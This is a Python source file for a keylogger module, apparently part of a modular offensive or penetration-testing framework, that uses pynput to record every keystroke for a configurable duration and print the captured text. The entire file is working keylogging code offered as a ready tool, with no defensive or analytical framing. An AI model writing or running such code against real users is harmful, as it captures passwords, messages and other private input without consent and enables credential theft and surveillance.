import time
import threading
from pynput import keyboard
from core.base_module import BaseModule
from rich.console import Console

class Keylogger(BaseModule):
    """Captures and logs keystrokes from the target machine."""

    def get_options(self):
        """
        Returns the options for this module.
        """
        return {
            'DURATION': [60, 'The duration in seconds to log keystrokes.'],
            'TARGET_HOST': ['localhost', 'Note: This module runs locally. This is for metadata.']
        }

    def run(self, options):
        """
        Executes the keylogger.
        """
        duration = int(options.get('DURATION'))
        console = Console()
        log = []

        def on_press(key):
            try:
                log.append(key.char)
            except AttributeError:
                # Handle special keys (e.g., space, enter)
                log.append(f'[{key}]')

        console.print(f"[*] Starting keylogger for {duration} seconds...")
        console.print("[yellow]Press Ctrl+C in the terminal to stop early.[/yellow]")

        listener = keyboard.Listener(on_press=on_press)
        listener.start()

        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            console.print("\\n[*] Keylogger stopped by user.")
        finally:
            listener.stop()
            listener.join()

        logged_keys = "".join(filter(None, log))
        if logged_keys:
            console.print("\n[bold green][+] Keystrokes captured:[/bold green]")
            console.print(logged_keys)
        else:
            console.print("\n[*] No keystrokes were captured.")